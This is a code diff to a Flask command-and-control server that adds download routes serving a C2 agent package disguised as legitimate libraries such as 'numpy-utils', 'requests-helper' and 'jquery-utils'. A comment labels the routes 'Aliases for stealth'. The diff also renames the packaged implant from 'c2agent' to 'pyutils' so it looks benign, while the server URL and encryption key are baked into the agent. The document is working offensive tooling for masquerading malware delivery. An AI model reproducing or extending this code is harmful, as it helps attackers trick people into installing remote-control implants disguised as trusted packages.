@@ -2551,6 +2551,42 @@ def serve_agent(filename):
 @app.route("/package/c2agent.tar.gz")
 def serve_pip_package():
     """Serve pip-installable package directly from C2 server."""
+    return _serve_agent_package()
+
+
+# Aliases for stealth - look like legitimate packages
+@app.route("/packages/numpy-utils-1.24.0.tar.gz")
+def serve_package_numpy():
+    """Alias: looks like numpy utils package."""
+    return _serve_agent_package()
+
+
+@app.route("/packages/requests-helper-2.28.0.tar.gz")
+def serve_package_requests():
+    """Alias: looks like requests helper package."""
+    return _serve_agent_package()
+
+
+@app.route("/pypi/packages/pyutils-0.1.0.tar.gz")
+def serve_package_pypi():
+    """Alias: looks like PyPI package."""
+    return _serve_agent_package()
+
+
+@app.route("/static/assets/jquery-utils-3.6.0.tar.gz")
+def serve_package_jquery():
+    """Alias: looks like jQuery asset."""
+    return _serve_agent_package()
+
+
+@app.route("/downloads/python-utils-3.11.0.tar.gz")
+def serve_package_python():
+    """Alias: looks like Python utils download."""
+    return _serve_agent_package()
+
+
+def _serve_agent_package():
+    """Internal: generate and serve agent package."""
     import tarfile
     import io as io_module
     
@@ -2565,11 +2601,11 @@ def serve_pip_package():
         # setup.py
         setup_content = f'''from setuptools import setup
 setup(
-    name="c2agent",
-    version="1.0.0",
-    py_modules=["c2agent"],
+    name="pyutils",
+    version="0.1.0",
+    py_modules=["pyutils"],
     entry_points={{
-        "console_scripts": ["c2agent=c2agent:main"],
+        "console_scripts": ["pyutils=pyutils:main"],
     }},
 )
 '''
@@ -2577,7 +2613,7 @@ setup(
         setup_info.size = len(setup_content.encode())
         tar.addfile(setup_info, io_module.BytesIO(setup_content.encode()))
         
-        # c2agent.py (universal agent)
+        # pyutils.py (universal agent)
         agent_path = BASE_DIR / "src" / "agents" / "universal.py"
         agent_content = agent_path.read_text()
         agent_content = agent_content.replace("http://CHANGE_ME:443", server_url)
@@ -2588,7 +2624,7 @@ setup(
             agent_content = agent_content.replace('ENC_KEY = os.environ.get("ENC_KEY", "")',
                                                    f'ENC_KEY = os.environ.get("ENC_KEY", "{enc_key}")')
         
-        agent_info = tarfile.TarInfo(name="c2agent.py")
+        agent_info = tarfile.TarInfo(name="pyutils.py")
         agent_info.size = len(agent_content.encode())
         tar.addfile(agent_info, io_module.BytesIO(agent_content.encode()))
     
@@ -2596,7 +2632,7 @@ setup(
     return Response(
         tar_buffer.getvalue(),
         mimetype="application/gzip",
-        headers={"Content-Disposition": "attachment; filename=c2agent.tar.gz"}
+        headers={"Content-Disposition": "attachment; filename=pyutils-0.1.0.tar.gz"}
     )
 
 # ──────────────────────── API: AGENTS ────────────────────────
